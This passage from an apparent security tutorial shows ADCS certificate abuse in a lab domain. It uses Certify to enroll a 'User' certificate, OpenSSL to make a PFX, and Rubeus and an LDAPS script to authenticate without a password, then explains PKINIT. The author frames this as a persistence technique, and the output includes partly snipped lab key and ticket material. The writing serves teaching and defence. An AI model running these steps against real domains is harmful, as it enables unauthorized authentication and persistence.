<span class="n">Certify</span> <span class="n">completed</span> <span class="ow">in</span> <span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mf">36.4021439</span>
</pre></div>
<p>As observed, the <strong>"User"</strong> template is enabled and allows authentication because it includes the <strong>Client Authentication</strong> EKU. While it also contains two additional EKUs, <strong>Client Authentication</strong> is the one that matters for our purposes.</p><br/>
<p>I’ve stripped the output for brevity, but if you run <strong>Certify</strong> in your environment, you will likely find <strong>multiple templates</strong> that allow authentication. These templates may not necessarily have the <strong>Client Authentication</strong> EKU—they could instead include <strong>Smart Card Logon</strong> or other authentication-related EKUs. However, the key takeaway is that any of these could potentially be used for authentication.</p><br/>
<h3>Enrollment Permissions Matter</h3><br/>
<p>It's important to note that <strong>not every template that allows authentication is directly usable</strong>. Even if a certificate template is enabled and includes a valid EKU, you <strong>still need the necessary permissions</strong> to enroll a certificate using that template.</p><br/>
<p>For example, in this case, the <strong>"User"</strong> template is not only enabled, but it also allows <strong>Domain Users</strong> to enroll. This means <strong>any standard user</strong> in the domain can request a certificate from this template <strong>without requiring elevated privileges</strong>.</p><br/>
<p>This distinction is crucial because some authentication-enabled templates may be restricted to <strong>specific security groups</strong> (e.g., only administrators can enroll). When looking for potential ADCS misconfigurations, we should focus on templates that:</p><br/>
<ul>
<li><strong>Allow authentication</strong> (EKUs like Client Authentication or Smart Card Logon).</li>
<li><strong>Are enabled</strong> for enrollment.</li>
<li><strong>Are accessible to low-privileged users or users that we have access.</strong></li>
</ul>
<h3>Requesting a certificate</h3><br/>
<p>Now that we have all the necessary information, let's request a certificate from <strong><code>elswixcorp-DC01-CA</code></strong>, using the <strong>"User"</strong> template:</p><br/>
<div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">tmp</span><span class="o">&gt;</span> <span class="o">.</span>\<span class="n">Certify</span> <span class="n">request</span> <span class="o">/</span><span class="n">template</span><span class="p">:</span><span class="n">User</span> <span class="o">/</span><span class="n">ca</span><span class="p">:</span><span class="n">dc01</span>\<span class="n">elswixcorp</span><span class="o">-</span><span class="n">DC01</span><span class="o">-</span><span class="n">CA</span>

   <span class="n">_____</span>          <span class="n">_</span>   <span class="n">_</span>  <span class="n">__</span>
  <span class="o">/</span> <span class="n">____</span><span class="o">|</span>        <span class="o">|</span> <span class="o">|</span> <span class="p">(</span><span class="n">_</span><span class="p">)</span><span class="o">/</span> <span class="n">_</span><span class="o">|</span>
 <span class="o">|</span> <span class="o">|</span>     <span class="n">___</span> <span class="n">_</span> <span class="n">__</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span> <span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span> <span class="n">_</span>   <span class="n">_</span>
 <span class="o">|</span> <span class="o">|</span>    <span class="o">/</span> <span class="n">_</span> \ <span class="s1">'__| __| |  _| | | |</span>
 <span class="o">|</span> <span class="o">|</span><span class="n">___</span><span class="o">|</span>  <span class="n">__</span><span class="o">/</span> <span class="o">|</span>  <span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span>
  \<span class="n">_____</span>\<span class="n">___</span><span class="o">|</span><span class="n">_</span><span class="o">|</span>   \<span class="n">__</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span>  \<span class="n">__</span><span class="p">,</span> <span class="o">|</span>
                             <span class="n">__</span><span class="o">/</span> <span class="o">|</span>
                            <span class="o">|</span><span class="n">___</span><span class="o">./</span>
  <span class="n">v1</span><span class="mf">.1.0</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Action</span><span class="p">:</span> <span class="n">Request</span> <span class="n">a</span> <span class="n">Certificates</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Current</span> <span class="n">user</span> <span class="n">context</span>    <span class="p">:</span> <span class="n">ELSWIXCORP</span>\<span class="n">elswix</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">No</span> <span class="n">subject</span> <span class="n">name</span> <span class="n">specified</span><span class="p">,</span> <span class="n">using</span> <span class="n">current</span> <span class="n">context</span> <span class="k">as</span> <span class="n">subject</span><span class="o">.</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Template</span>                <span class="p">:</span> <span class="n">User</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Subject</span>                 <span class="p">:</span> <span class="n">CN</span><span class="o">=</span><span class="n">elswix</span><span class="p">,</span> <span class="n">CN</span><span class="o">=</span><span class="n">Users</span><span class="p">,</span> <span class="n">DC</span><span class="o">=</span><span class="n">elswixcorp</span><span class="p">,</span> <span class="n">DC</span><span class="o">=</span><span class="n">local</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Certificate</span> <span class="n">Authority</span>   <span class="p">:</span> <span class="n">dc01</span>\<span class="n">elswixcorp</span><span class="o">-</span><span class="n">DC01</span><span class="o">-</span><span class="n">CA</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">CA</span> <span class="n">Response</span>             <span class="p">:</span> <span class="n">The</span> <span class="n">certificate</span> <span class="n">had</span> <span class="n">been</span> <span class="n">issued</span><span class="o">.</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Request</span> <span class="n">ID</span>              <span class="p">:</span> <span class="mi">50</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">cert</span><span class="o">.</span><span class="n">pem</span>         <span class="p">:</span>

<span class="o">-----</span><span class="n">BEGIN</span> <span class="n">RSA</span> <span class="n">PRIVATE</span> <span class="n">KEY</span><span class="o">-----</span>
<span class="n">MIIEowIBAAKCAQEAxoS9beFX0Qssyg65b0H1SHnaQJtT5ARhL8XmPeGGih3krS0D</span>
<span class="mi">95</span><span class="n">gFJxwJwntQLWASrDM2w1lG</span><span class="o">+</span><span class="n">RXu4IIGYlpLJSCqxiG1WWQfKQolj3cnwP89CxiS</span>
<span class="n">eQjtFlHj6wy4HqD4sbsUlG99vP3zVrmngLqSQM4TJBsLRp3</span><span class="o">/</span><span class="n">YY9FwTFGLS0Cfoxx</span>
<span class="n">DsHlhaCP0ZYRHH8cKez4ayVVuirfQdU53aCvcrvEPW63KZacSDmkigk68f3JQZAD</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
<span class="n">HgyUKQKBgBuNTQRsN6qroEwE4znCguwA1aISihoh35pw3wtx6P9Sw</span><span class="o">/</span><span class="n">Yp0uds8YIr</span>
<span class="mi">2</span><span class="n">zkAuDVj0OKYWt5y6of2</span><span class="o">+</span><span class="n">iNenoqioKcjXediq</span><span class="o">+</span><span class="n">MXEaGlAC734bhDBrdSWBjGMfR8</span>
<span class="n">kJ73syR7zKg4jch</span><span class="o">/</span><span class="n">wmMw0ilzDYhiqEuSa2PQEpvdMCEG8RqtguCq</span>
<span class="o">-----</span><span class="n">END</span> <span class="n">RSA</span> <span class="n">PRIVATE</span> <span class="n">KEY</span><span class="o">-----</span>
<span class="o">-----</span><span class="n">BEGIN</span> <span class="n">CERTIFICATE</span><span class="o">-----</span>
<span class="n">MIIGfTCCBWWgAwIBAgITNQAAADI7</span><span class="o">/</span><span class="mi">1</span><span class="n">bcGzupSwAAAAAAMjANBgkqhkiG9w0BAQsF</span>
<span class="n">ADBQMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGjAYBgoJkiaJk</span><span class="o">/</span><span class="n">IsZAEZFgplbHN3</span>
<span class="n">aXhjb3JwMRswGQYDVQQDExJlbHN3aXhjb3JwLURDMDEtQ0EwHhcNMjUwMzE4MDAz</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
<span class="n">kk0W</span><span class="o">/</span><span class="n">E7wNZyMq1H</span><span class="o">+</span><span class="n">MGQURQZbfJHZ8iBjU8mAZ6qYtQfD</span><span class="o">+</span><span class="mi">5</span><span class="n">HO2nw0Tq9TVuiuP9uL</span>
<span class="n">Ye3u</span><span class="o">+</span><span class="n">brEjqVf39OPFK23Y7AGDWw5XnrdcP99vM5todW5ERPkcUH6mdoFd7i14H0y</span>
<span class="n">wBWCarEjaUTm4eOwPOzhRbD6</span><span class="o">+</span><span class="n">PjgHc89zoofRcCXcXTo</span>
<span class="o">-----</span><span class="n">END</span> <span class="n">CERTIFICATE</span><span class="o">-----</span>


<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Convert</span> <span class="k">with</span><span class="p">:</span> <span class="n">openssl</span> <span class="n">pkcs12</span> <span class="o">-</span><span class="ow">in</span> <span class="n">cert</span><span class="o">.</span><span class="n">pem</span> <span class="o">-</span><span class="n">keyex</span> <span class="o">-</span><span class="n">CSP</span> <span class="s2">"Microsoft Enhanced Cryptographic Provider v1.0"</span> <span class="o">-</span><span class="n">export</span> <span class="o">-</span><span class="n">out</span> <span class="n">cert</span><span class="o">.</span><span class="n">pfx</span>



<span class="n">Certify</span> <span class="n">completed</span> <span class="ow">in</span> <span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mf">03.7539145</span>
</pre></div>
<p>As seen in the output, the request was <strong>successfully accepted</strong>, and the CA issued a certificate for us. The output also suggests using <strong>OpenSSL</strong> to convert the certificate into a <code>.pfx</code> file.</p><br/>
<h3>Converting the Certificate to PFX</h3><br/>
<p>To do this, we first need to <strong>copy the returned certificate along with the generated private key</strong> into a <code>.pem</code> file:</p><br/>
<div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">tmp</span><span class="o">&gt;</span> <span class="n">cat</span> <span class="n">cert</span><span class="o">.</span><span class="n">pem</span>
<span class="o">-----</span><span class="n">BEGIN</span> <span class="n">RSA</span> <span class="n">PRIVATE</span> <span class="n">KEY</span><span class="o">-----</span>
<span class="n">MIIEowIBAAKCAQEAxoS9beFX0Qssyg65b0H1SHnaQJtT5ARhL8XmPeGGih3krS0D</span>
<span class="mi">95</span><span class="n">gFJxwJwntQLWASrDM2w1lG</span><span class="o">+</span><span class="n">RXu4IIGYlpLJSCqxiG1WWQfKQolj3cnwP89CxiS</span>
<span class="n">eQjtFlHj6wy4HqD4sbsUlG99vP3zVrmngLqSQM4TJBsLRp3</span><span class="o">/</span><span class="n">YY9FwTFGLS0Cfoxx</span>
<span class="n">DsHlhaCP0ZYRHH8cKez4ayVVuirfQdU53aCvcrvEPW63KZacSDmkigk68f3JQZAD</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
<span class="n">HgyUKQKBgBuNTQRsN6qroEwE4znCguwA1aISihoh35pw3wtx6P9Sw</span><span class="o">/</span><span class="n">Yp0uds8YIr</span>
<span class="mi">2</span><span class="n">zkAuDVj0OKYWt5y6of2</span><span class="o">+</span><span class="n">iNenoqioKcjXediq</span><span class="o">+</span><span class="n">MXEaGlAC734bhDBrdSWBjGMfR8</span>
<span class="n">kJ73syR7zKg4jch</span><span class="o">/</span><span class="n">wmMw0ilzDYhiqEuSa2PQEpvdMCEG8RqtguCq</span>
<span class="o">-----</span><span class="n">END</span> <span class="n">RSA</span> <span class="n">PRIVATE</span> <span class="n">KEY</span><span class="o">-----</span>
<span class="o">-----</span><span class="n">BEGIN</span> <span class="n">CERTIFICATE</span><span class="o">-----</span>
<span class="n">MIIGfTCCBWWgAwIBAgITNQAAADI7</span><span class="o">/</span><span class="mi">1</span><span class="n">bcGzupSwAAAAAAMjANBgkqhkiG9w0BAQsF</span>
<span class="n">ADBQMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGjAYBgoJkiaJk</span><span class="o">/</span><span class="n">IsZAEZFgplbHN3</span>
<span class="n">aXhjb3JwMRswGQYDVQQDExJlbHN3aXhjb3JwLURDMDEtQ0EwHhcNMjUwMzE4MDAz</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
<span class="n">kk0W</span><span class="o">/</span><span class="n">E7wNZyMq1H</span><span class="o">+</span><span class="n">MGQURQZbfJHZ8iBjU8mAZ6qYtQfD</span><span class="o">+</span><span class="mi">5</span><span class="n">HO2nw0Tq9TVuiuP9uL</span>
<span class="n">Ye3u</span><span class="o">+</span><span class="n">brEjqVf39OPFK23Y7AGDWw5XnrdcP99vM5todW5ERPkcUH6mdoFd7i14H0y</span>
<span class="n">wBWCarEjaUTm4eOwPOzhRbD6</span><span class="o">+</span><span class="n">PjgHc89zoofRcCXcXTo</span>
<span class="o">-----</span><span class="n">END</span> <span class="n">CERTIFICATE</span><span class="o">-----</span>
</pre></div>
<p>Now, we’ll use <strong>OpenSSL</strong> to convert this <code>.pem</code> file into a <code>.pfx</code> file, as instructed by Certify:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">openssl</span> <span class="n">pkcs12</span> <span class="o">-</span><span class="ow">in</span> <span class="n">cert</span><span class="o">.</span><span class="n">pem</span> <span class="o">-</span><span class="n">keyex</span> <span class="o">-</span><span class="n">CSP</span> <span class="s2">"Microsoft Enhanced Cryptographic Provider v1.0"</span> <span class="o">-</span><span class="n">export</span> <span class="o">-</span><span class="n">out</span> <span class="n">cert</span><span class="o">.</span><span class="n">pfx</span>
<span class="n">Enter</span> <span class="n">Export</span> <span class="n">Password</span><span class="p">:</span>
<span class="n">Verifying</span> <span class="o">-</span> <span class="n">Enter</span> <span class="n">Export</span> <span class="n">Password</span><span class="p">:</span>
</pre></div>
<p>This process successfully creates the <strong><code>cert.pfx</code></strong> file, which we can now use for authentication.</p><br/>
<h3>Kerberos Authentication through PKINIT</h3><br/>
<p>Now that we have the certificate, we can use it to perform <strong>Kerberos authentication</strong>. This is particularly powerful because it allows us to authenticate <strong>without needing the user’s password</strong>.</p><br/>
<p>Even better, the certificate remains <strong>valid for a year</strong> by default, as specified in the <strong>User</strong> template. Additionally, the certificate will still work <strong>even if the user changes their password</strong>, making ADCS exploitation an excellent <strong>persistence mechanism</strong> in an Active Directory environment.</p><br/>
<h3>Using Rubeus for Authentication</h3><br/>
<p>For this example, I’ll use <strong>Rubeus</strong> to authenticate with the certificate. First, I’ll upload the <code>cert.pfx</code> file to the target <strong>Windows machine</strong>.</p><br/>
<p>Now, let’s execute <strong>Rubeus</strong>:</p><br/>
<div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">tmp</span><span class="o">&gt;</span> <span class="o">.</span>\<span class="n">rubeus</span> <span class="n">asktgt</span> <span class="o">/</span><span class="n">user</span><span class="p">:</span><span class="n">elswix</span> <span class="o">/</span><span class="n">certificate</span><span class="p">:</span><span class="o">.</span>\<span class="n">cert</span><span class="o">.</span><span class="n">pfx</span>

   <span class="n">______</span>        <span class="n">_</span>
  <span class="p">(</span><span class="n">_____</span> \      <span class="o">|</span> <span class="o">|</span>
   <span class="n">_____</span><span class="p">)</span> <span class="p">)</span><span class="n">_</span>   <span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">__</span>  <span class="n">_____</span> <span class="n">_</span>   <span class="n">_</span>  <span class="n">___</span>
  <span class="o">|</span>  <span class="n">__</span>  <span class="o">/|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span>  <span class="n">_</span> \<span class="o">|</span> <span class="n">___</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|/</span><span class="n">___</span><span class="p">)</span>
  <span class="o">|</span> <span class="o">|</span>  \ \<span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="p">)</span> <span class="p">)</span> <span class="n">____</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">___</span> <span class="o">|</span>
  <span class="o">|</span><span class="n">_</span><span class="o">|</span>   <span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">____</span><span class="o">/|</span><span class="n">____</span><span class="o">/|</span><span class="n">_____</span><span class="p">)</span><span class="n">____</span><span class="o">/</span><span class="p">(</span><span class="n">___</span><span class="o">/</span>

  <span class="n">v2</span><span class="mf">.3.3</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Action</span><span class="p">:</span> <span class="n">Ask</span> <span class="n">TGT</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="n">domain</span><span class="p">:</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Using</span> <span class="n">PKINIT</span> <span class="k">with</span> <span class="n">etype</span> <span class="n">rc4_hmac</span> <span class="ow">and</span> <span class="n">subject</span><span class="p">:</span> <span class="n">E</span><span class="o">=</span><span class="n">elswixpwn</span><span class="nd">@elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="p">,</span> <span class="n">CN</span><span class="o">=</span><span class="n">elswix</span><span class="p">,</span> <span class="n">CN</span><span class="o">=</span><span class="n">Users</span><span class="p">,</span> <span class="n">DC</span><span class="o">=</span><span class="n">elswixcorp</span><span class="p">,</span> <span class="n">DC</span><span class="o">=</span><span class="n">local</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Building</span> <span class="n">AS</span><span class="o">-</span><span class="n">REQ</span> <span class="p">(</span><span class="n">w</span><span class="o">/</span> <span class="n">PKINIT</span> <span class="n">preauth</span><span class="p">)</span> <span class="k">for</span><span class="p">:</span> <span class="s1">'elswixcorp.local\elswix'</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Using</span> <span class="n">domain</span> <span class="n">controller</span><span class="p">:</span> <span class="n">fe80</span><span class="p">::</span><span class="mi">5</span><span class="n">cf7</span><span class="p">:</span><span class="mi">8085</span><span class="p">:</span><span class="n">cc83</span><span class="p">:</span><span class="n">dac2</span><span class="o">%</span><span class="mi">16</span><span class="p">:</span><span class="mi">88</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">TGT</span> <span class="n">request</span> <span class="n">successful</span><span class="err">!</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">base64</span><span class="p">(</span><span class="n">ticket</span><span class="o">.</span><span class="n">kirbi</span><span class="p">):</span>

      <span class="n">doIGLjCCBiqgAwIBBaE</span><span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>    <span class="n">GwZrcmJ0Z3QbEGVsc3dpeGNvcnAubG9jYWw</span><span class="o">=</span>

  <span class="n">ServiceName</span>              <span class="p">:</span>  <span class="n">krbtgt</span><span class="o">/</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
  <span class="n">ServiceRealm</span>             <span class="p">:</span>  <span class="n">ELSWIXCORP</span><span class="o">.</span><span class="n">LOCAL</span>
  <span class="n">UserName</span>                 <span class="p">:</span>  <span class="n">elswix</span> <span class="p">(</span><span class="n">NT_PRINCIPAL</span><span class="p">)</span>
  <span class="n">UserRealm</span>                <span class="p">:</span>  <span class="n">ELSWIXCORP</span><span class="o">.</span><span class="n">LOCAL</span>
  <span class="n">StartTime</span>                <span class="p">:</span>  <span class="mi">3</span><span class="o">/</span><span class="mi">19</span><span class="o">/</span><span class="mi">2025</span> <span class="mi">4</span><span class="p">:</span><span class="mi">36</span><span class="p">:</span><span class="mi">31</span> <span class="n">PM</span>
  <span class="n">EndTime</span>                  <span class="p">:</span>  <span class="mi">3</span><span class="o">/</span><span class="mi">20</span><span class="o">/</span><span class="mi">2025</span> <span class="mi">2</span><span class="p">:</span><span class="mi">36</span><span class="p">:</span><span class="mi">31</span> <span class="n">AM</span>
  <span class="n">RenewTill</span>                <span class="p">:</span>  <span class="mi">3</span><span class="o">/</span><span class="mi">26</span><span class="o">/</span><span class="mi">2025</span> <span class="mi">4</span><span class="p">:</span><span class="mi">36</span><span class="p">:</span><span class="mi">31</span> <span class="n">PM</span>
  <span class="n">Flags</span>                    <span class="p">:</span>  <span class="n">name_canonicalize</span><span class="p">,</span> <span class="n">pre_authent</span><span class="p">,</span> <span class="n">initial</span><span class="p">,</span> <span class="n">renewable</span><span class="p">,</span> <span class="n">forwardable</span>
  <span class="n">KeyType</span>                  <span class="p">:</span>  <span class="n">rc4_hmac</span>
  <span class="n">Base64</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>              <span class="p">:</span>  <span class="n">LTMnSBv8</span><span class="o">/</span><span class="n">HNIkbMR</span><span class="o">/</span><span class="n">nupKg</span><span class="o">==</span>
  <span class="n">ASREP</span> <span class="p">(</span><span class="n">key</span><span class="p">)</span>              <span class="p">:</span>  <span class="mi">2896</span><span class="n">B80E5C72C3A02E48FD26065FFA7B</span>
</pre></div>
<p>As seen in the output, the <strong>KDC has returned a valid TGT</strong> (Ticket Granting Ticket) for <strong>elswix</strong>. Now, we can use this TGT to authenticate as <strong>elswix</strong> and leverage their privileges.</p><br/>
<p><strong>Note:</strong> In this case, it doesn’t grant additional access since we initially requested the certificate as <strong>elswix</strong>, but if we had obtained a certificate for a higher-privileged user, we could now operate with <strong>their</strong> privileges.</p><br/>
<h3>Certificate-Based Authentication through Schannel</h3><br/>
<p>In addition to <strong>PKINIT</strong>, some protocols use <strong>Schannel</strong>, the security package behind <strong>SSL/TLS</strong>, to authenticate domain users with certificates. One common use case is <strong>LDAPS (LDAP over SSL/TLS)</strong>, where authentication is performed using a certificate instead of traditional credentials.</p><br/>
<p>For example, a user can authenticate to <strong>LDAPS</strong> with a certificate and execute an <strong>LDAP whoami</strong> query to determine which account was authenticated. This means that if an attacker obtains a valid authentication certificate, they may be able to authenticate via <strong>LDAPS</strong> using Schannel, further expanding potential attack vectors beyond Kerberos.</p><br/>
<p>For example, let's use the same certificate we obtained earlier to authenticate through Schannel. To do this, I'll use the script <a href="https://github.com/leechristensen/Random/blob/master/PowerShellScripts/Get-LdapCurrentUser.ps1">Get-LdapCurrentUser.ps1</a>:</p><br/>
<div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">tmp</span><span class="o">&gt;</span> <span class="n">Get</span><span class="o">-</span><span class="n">LdapCurrentUser</span> <span class="o">-</span><span class="n">Certificate</span> <span class="n">C</span><span class="p">:</span>\<span class="n">tmp</span>\<span class="n">cert</span><span class="o">.</span><span class="n">pfx</span> <span class="o">-</span><span class="n">UseSSL</span> <span class="o">-</span><span class="n">Server</span> <span class="n">dc01</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="p">:</span><span class="mi">636</span>
<span class="n">u</span><span class="p">:</span><span class="n">ELSWIXCORP</span>\<span class="n">elswix</span>
<span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">tmp</span><span class="o">&gt;</span>
</pre></div>
<h3>Kerberos Authentication through PKINIT (Process)</h3><br/>
<p>Before diving into how <strong>ADCS can be abused</strong>, let's first break down <strong>what happened in the previous stage</strong>—from requesting a certificate to obtaining a <strong>Ticket Granting Ticket (TGT) from the KDC</strong>.</p><br/>
<p>I want to emphasize that <strong>this explanation is highly simplified</strong> for better understanding. Some technical details have been omitted to focus on the <strong>core concepts</strong> of the process.</p><br/>
<h3>The Certificate Request Process</h3><br/>
<p>The image below illustrates the process of requesting a certificate from the CA:</p><br/>
<p><img alt="" src="https://elswix.github.io/articles/17/img/Cert-Services-2.png"/></p><br/>
<p>Now, let's describe what’s happening at each step.</p><br/>
<br/><h3>Step 1: Generating the Certificate Signing Request (CSR)</h3><br/>
<ul>
<li>The user generates a <strong>public/private key pair</strong>, which is stored by Windows.</li>
<li>Using these keys, the user creates a <strong>Certificate Signing Request (CSR)</strong>, which includes:<ul>
<li>The <strong>public key</strong> (generated earlier).</li>
<li>The <strong>subject</strong> (who the certificate is being issued for).</li>
<li>The <strong>certificate template</strong> they want to use.</li>
<li>The <strong>Extended Key Usage (EKU)</strong> defining how the certificate can be used.</li>
</ul>
</li>
</ul>
<p><strong>Why does the user include their public key in the CSR?</strong> </p><br/>
<p>Because once the <strong>Certificate Authority (CA) issues the certificate</strong>, it will <strong>copy the public key into the final certificate</strong>. This ensures that only the user <strong>who possesses the corresponding private key</strong> can use the certificate.</p><br/>
<p><strong>Note:</strong> If you're familiar with <strong>PKI (Public Key Infrastructure)</strong>, you might already understand why this matters. If not, you’ll see its importance when we explain the <strong>Kerberos PKINIT authentication process</strong> later.</p><br/>
<p>Once the CSR is complete, the user sends it to the <strong>CA for approval</strong>.</p><br/>
<br/><h3>Step 2: CA Validation</h3><br/>
<p>When the CA receives the <strong>CSR</strong>, it performs a series of <strong>checks</strong> to determine whether the user is authorized to request the certificate.</p><br/>
<p><strong>1. Verifies the certificate template</strong></p><br/>
<p>The CA checks if the <strong>specified template</strong> exists. In this case, the user requested the <strong>"User"</strong> template, which <strong>exists</strong>, so the process continues.</p><br/>
<p><strong>2. Checks if the requested settings are allowed</strong></p><br/>
<p>The CA verifies whether the <strong>CSR's requested settings</strong> match the template’s restrictions. Here, the requested <strong>EKU is "Client Authentication"</strong>, which the <strong>User template allows by default</strong>. (In reality, the CSR contains <strong>more settings</strong>, but we are simplifying the process to focus on the main idea).</p><br/>
<p><strong>3. Ensures the user has permission to enroll</strong></p><br/>
<p>The CA checks whether the user has <strong>sufficient privileges to request a certificate using this template</strong>. In this case, the <strong>User template allows Domain Users to enroll</strong>, so the request is approved.</p><br/>
<p>If any of these checks fail, the <strong>CA rejects the request</strong>.</p><br/>
<br/><h3>Step 3: Certificate Issuance</h3><br/>
<p>If all validation checks <strong>pass</strong>, the CA:</p><br/>
<ul>
<li>Generates a <strong>new certificate</strong> based on the settings defined in the <strong>template</strong>.  </li>
<li><strong>Copies the public key</strong> from the CSR into the certificate.  </li>
<li><strong>Signs the certificate</strong> using the <strong>CA’s private key</strong> (proving its authenticity).  </li>
<li><strong>Returns the issued certificate</strong> to the client.</li>
</ul>
<p>At this point, the user has <strong>a valid certificate</strong> that can be used for authentication.</p><br/>
<br/><h3>Step 4: Storing and Using the Certificate</h3><br/>
<p>Once the user receives the certificate, it is <strong>saved to the Windows Certificate Store</strong> for future use. This certificate can now be used for <strong>authentication</strong>, as the <strong>EKU within it explicitly allows authentication operations</strong> (e.g., Client Authentication).</p><br/>
<h3>Kerberos Authentication with Certificates</h3><br/>
<p>Before describing the Kerberos Authentication process, I want to introduce the concept of Subject Alternative Name (SAN). </p><br/>
<p>Now, let's break down how <strong>Kerberos authentication</strong> works when using <strong>certificates</strong>. The image below provides a <strong>simplified representation</strong> of how the <strong><code>KRB_AS_REQ</code></strong> message is structured in this process:</p><br/>
<h3>Note</h3><br/>
<p>To fully grasp this process, you should first understand <strong>how Kerberos authentication works</strong>. You can refer to my <strong>Kerberos authentication article</strong> for a deeper explanation.</p><br/>
<p><img alt="" src="https://elswix.github.io/articles/17/img/Cert-Services-3.png"/></p><br/>
<p>While this request is <strong>similar</strong> to a traditional <strong><code>KRB_AS_REQ</code></strong>, there are some key differences that we’ll explore.</p><br/>
<p><strong>Note:</strong> The image above is a <strong>simplified</strong> representation of the <code>KRB_AS_REQ</code> message. In reality, it contains additional fields, but this explanation covers the essential details needed to understand the process.</p><br/>
<p>Unlike a <strong>regular Kerberos AS-REQ</strong>, this request <strong>includes a certificate</strong>—specifically, the one we obtained in the <strong>previous step</strong>.</p><br/>
<p>Additionally, it contains a <strong>timestamp</strong> value, which serves as the <strong>authenticator structure</strong>. However, <strong>this timestamp is encrypted using the client’s private key</strong> (the same private key generated when requesting the certificate).</p><br/>
<p>The encryption of the <strong>timestamp</strong> using the private key is a <strong>critical security mechanism</strong> in <strong>PKINIT</strong>. This process ensures that the <strong>certificate is valid</strong> and that the <strong>request is genuinely coming from the user</strong> who owns the corresponding <strong>private key</strong>.</p><br/>
<p><strong>1. KDC Receives the <code>KRB_AS_REQ</code> and Extracts the Certificate</strong></p><br/>
<ul>
<li>
<p>The <strong>KDC verifies the certificate's validity</strong> by performing several checks. It ensures that the <strong>certificate is still valid</strong> (not expired or revoked) and that the <strong>certificate's signature</strong> is legitimate, meaning it was issued by a <strong>trusted CA</strong> within the <strong>NTAuthCertificates</strong> container. This verification process relies on the <strong>trust chain</strong>, where the KDC follows the certificate’s <strong>issuer hierarchy</strong> to confirm that it ultimately leads to a trusted <strong>Root CA</strong>.</p><br/>
</li>
<li>
<p>Additionally, the KDC checks whether the <strong>specified user in the AS-REQ matches</strong> the identity in the certificate. However, contrary to what one might expect, this check is <strong>not performed against the Subject field</strong> of the certificate. Instead, as we’ll explain later, the KDC actually verifies the <strong>User Principal Name (UPN) found in the Subject Alternative Name (SAN) field</strong>, or another identity field that can be used for mapping.</p><br/>
</li>
<li>
<p>It also checks some other fields that are not relevant for the explaination.</p><br/>
</li>
</ul>
<p><strong>2. KDC Retrieves the Public Key from the Certificate</strong></p><br/>
<ul>
<li>The <strong>public key</strong> is embedded within the certificate, and the KDC extracts it.</li>
</ul>
<p><strong>3. KDC Attempts to Decrypt the Timestamp</strong></p><br/>
<ul>
<li>The <strong>timestamp</strong> in the request was <strong>encrypted using the user’s private key</strong> before being sent. The <strong>KDC attempts to decrypt it using the extracted public key</strong> from the certificate.</li>
</ul>
<p><strong>4. If the Decryption is Successful:</strong></p><br/>
<ul>
<li>This <strong>proves that the user possesses the correct private key</strong>, meaning:<br/>
    The request <strong>was not tampered with</strong>.<br/>
    The request <strong>was made by the legitimate user</strong> associated with the certificate.</li>
</ul>
